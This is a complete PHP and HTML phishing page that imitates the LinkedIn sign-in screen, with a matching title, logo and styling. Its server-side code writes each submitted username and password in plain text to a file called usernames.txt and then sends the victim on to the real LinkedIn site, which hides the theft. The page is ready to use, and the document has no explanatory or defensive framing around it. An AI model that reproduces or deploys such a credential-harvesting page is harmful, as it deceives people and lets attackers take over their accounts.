<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $data = "username: " . $_POST['username'] . " | password: " . $_POST['password'] . "\n";
    file_put_contents("usernames.txt", $data, FILE_APPEND);
    header("Location: https://www.linkedin.com");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head><title>LinkedIn – Log In</title><meta charset="UTF-8"></head>
<body style="background: #f3f2ef; font-family: Arial, sans-serif; text-align: center; margin-top: 80px;">
<div style="background: white; width: 350px; margin: auto; padding: 24px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
<img src="https://content.linkedin.com/content/dam/me/business/en-us/amp/brand-site/v2/bg/LI-Bug.svg.original.svg" width="50"><br>
<h2>Sign in</h2>
<form method="post">
<input type="text" name="username" placeholder="Email or phone number" style="width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 2px;" required><br>
<input type="password" name="password" placeholder="Password" style="width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 2px;" required><br>
<button type="submit" style="background: #0a66c2; color: white; width: 95%; padding: 12px; border: none; border-radius: 28px; font-size: 16px;">Sign in</button>
</form>
</div>
</body>
</html>
